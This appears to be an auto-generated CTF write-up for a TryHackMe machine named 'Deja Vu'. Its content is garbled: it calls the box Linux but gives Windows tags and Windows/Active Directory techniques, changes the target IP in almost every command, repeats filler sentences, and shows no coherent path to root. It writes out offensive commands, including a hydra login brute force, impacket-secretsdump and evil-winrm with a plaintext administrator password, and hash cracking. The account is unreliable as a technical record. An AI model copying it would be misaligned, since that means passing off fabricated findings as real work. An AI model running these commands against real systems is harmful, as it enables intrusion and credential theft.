---
TitleSEO: "TryHackMe — Deja Vu (Insane Linux) | ZureFX"
TitlePost: "TryHackMe — Deja Vu (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Deja Vu. AlwaysInstallElevated and Pass the Ticket to achieve insane compromise on Linux."
Keywords: "windows, hard, medium"
URL: "https://zurefx.github.io/writeups/htb-deja-vu-263.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-deja-vu-263/"
Date: "2025-03-26"
Tags: "Windows, Hard, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-deja-vu-263"
Permalink: "/writeups/htb-deja-vu-263.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Deja Vu** is rated **Insane** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.69.172.25`.

### Objectives

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.40.162 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5986,139,3306 10.54.66.253 -oN scan.txt
```

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.93.88.22/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.15.142/FUZZ
nmap -sCV -p27017,636,139 10.86.70.106 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.103.83.52/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.22.4.62/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Silver Ticket**.

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p464,8888,8443 10.111.176.183 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.40.132
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.48.24
feroxbuster -h
```

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.123.4.33 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.116.33/FUZZ
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
gobuster dir -u http://10.55.169.64/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `netcat`
- `smbclient`
- `GetNPUsers`
- `rubeus`
- `sqlmap`
- `burpsuite`

### Key Takeaways

- AlwaysInstallElevated
- Pass the Ticket
- Silver Ticket
